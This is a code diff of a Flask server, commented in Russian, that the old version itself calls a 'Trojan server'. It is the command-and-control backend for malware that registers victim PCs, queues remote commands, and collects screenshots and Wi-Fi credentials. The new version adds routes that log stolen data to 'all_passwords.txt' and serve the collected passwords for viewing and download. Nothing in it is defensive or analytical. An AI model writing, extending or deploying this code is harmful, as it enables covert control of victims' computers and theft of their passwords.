@@ -1,79 +1,76 @@
-from flask import Flask, request, send_file, jsonify
-import os
+from flask import Flask, request, jsonify, send_file
+from flask_cors import CORS
 import json
+import os
+from datetime import datetime
 
 app = Flask(__name__)
+CORS(app)
 
-pending_commands = {}
-active_clients = {}
+# Хранилище
+clients = {}  # chat_id -> pc_name
+results = {}  # chat_id -> последний результат
+all_results = []  # список всех результатов
 
-SCREENSHOT_DIR = "/tmp/screenshots"
-if not os.path.exists(SCREENSHOT_DIR):
-    os.makedirs(SCREENSHOT_DIR)
-
-@app.route('/')
-def home():
-    return "Trojan server works! ✅"
-
-@app.route('/health')
-def health():
-    return "OK", 200
+RESULT_FILE = "all_passwords.txt"
 
 @app.route('/register/<chat_id>', methods=['POST'])
 def register(chat_id):
     data = request.get_json()
     pc_name = data.get('pc_name', 'Unknown')
-    active_clients[chat_id] = pc_name
+    clients[chat_id] = pc_name
     return jsonify({"status": "ok"})
 
-@app.route('/clients', methods=['GET'])
+@app.route('/clients')
 def get_clients():
-    return jsonify(active_clients)
-
-@app.route('/poll/<chat_id>', methods=['GET'])
-def poll(chat_id):
-    if chat_id in pending_commands and pending_commands[chat_id]:
-        cmd = pending_commands[chat_id]
-        pending_commands[chat_id] = None
-        return cmd
-    return "NO_CMD"
+    return jsonify(clients)
 
 @app.route('/cmd/<chat_id>', methods=['POST'])
-def cmd(chat_id):
-    pending_commands[chat_id] = request.data.decode('utf-8')
-    return "OK"
+def send_cmd(chat_id):
+    cmd = request.data.decode()
+    # В реальном боте команды хранятся в очереди
+    # Здесь упрощённо
+    return jsonify({"status": "sent"})
 
-@app.route('/upload/<chat_id>', methods=['POST'])
-def upload(chat_id):
-    if 'screenshot' not in request.files:
-        return "NO FILE"
-    f = request.files['screenshot']
-    f.save(os.path.join(SCREENSHOT_DIR, f'{chat_id}.png'))
-    return "OK"
+@app.route('/poll/<chat_id>')
+def poll(chat_id):
+    # В реальности нужна очередь команд
+    return "NO_CMD"
 
-@app.route('/screenshot/<chat_id>', methods=['GET'])
-def get_screenshot(chat_id):
-    path = os.path.join(SCREENSHOT_DIR, f'{chat_id}.png')
-    if os.path.exists(path):
-        return send_file(path, mimetype='image/png')
-    return "NO SCREENSHOT"
+@app.route('/result/<chat_id>')
+def get_result(chat_id):
+    return results.get(chat_id, "NO_RESULT")
 
-# ========== НОВЫЙ МАРШРУТ ДЛЯ WI-FI ПАРОЛЕЙ ==========
-@app.route('/upload_wifi/<chat_id>', methods=['POST'])
-def upload_wifi(chat_id):
-    if 'file' not in request.files:
-        return "NO FILE"
-    f = request.files['file']
-    f.save(f"wifi_{chat_id}.txt")
-    return "OK"
+@app.route('/result/<chat_id>', methods=['GET'])
+def add_result_route(chat_id):
+    text = request.args.get('data', '')
+    if text:
+        results[chat_id] = text
+        # Сохраняем в файл
+        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        pc_name = clients.get(chat_id, chat_id)
+        with open(RESULT_FILE, "a", encoding="utf-8") as f:
+            f.write(f"[{timestamp}] {pc_name} ({chat_id}): {text}\n")
+        all_results.append({"time": timestamp, "pc": pc_name, "result": text})
+    return jsonify({"status": "ok"})
 
-@app.route('/get_wifi/<chat_id>', methods=['GET'])
-def get_wifi(chat_id):
-    path = f"wifi_{chat_id}.txt"
-    if os.path.exists(path):
-        return send_file(path, as_attachment=True)
-    return "NO FILE", 404
+@app.route('/view-results')
+def view_results():
+    if not os.path.exists(RESULT_FILE):
+        return "Нет результатов"
+    with open(RESULT_FILE, "r", encoding="utf-8") as f:
+        content = f.read()
+    return f"<pre>{content}</pre>"
+
+@app.route('/view-results/json')
+def view_results_json():
+    return jsonify(all_results)
+
+@app.route('/download-results')
+def download_results():
+    if os.path.exists(RESULT_FILE):
+        return send_file(RESULT_FILE, as_attachment=True)
+    return "Нет файла"
 
 if __name__ == '__main__':
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host='0.0.0.0', port=port)
+    app.run(host='0.0.0.0', port=5000)
